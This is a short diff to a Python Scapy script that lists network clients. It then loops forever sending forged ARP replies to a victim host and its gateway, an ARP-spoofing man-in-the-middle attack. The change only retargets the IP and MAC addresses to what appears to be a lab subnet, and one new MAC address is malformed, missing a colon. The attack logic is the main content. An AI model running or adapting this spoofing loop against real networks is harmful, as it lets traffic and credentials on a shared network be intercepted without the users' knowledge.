@@ -19,9 +19,9 @@ for client in clients:
     print("{:16}    {}".format(client['ip'], client['mac']))
 
 while True:
-    arp_response = ARP(pdst="192.168.0.27", hwdst="08:00:27:fc:be:52", psrc="192.168.0.1")
+    arp_response = ARP(pdst="10.10.3.11", hwdst="08:00:27:d8:18:28", psrc="10.10.3.254")
     scap.send(arp_response)
-    arp_response = ARP(pdst="192.168.0.1", hwdst="b8:d9:4d:0a:16:3c", psrc="192.168.0.27")
+    arp_response = ARP(pdst="10.10.3.254", hwdst="08:00:27:fc:be52", psrc="10.10.3.11")
     scap.send(arp_response)
         
 
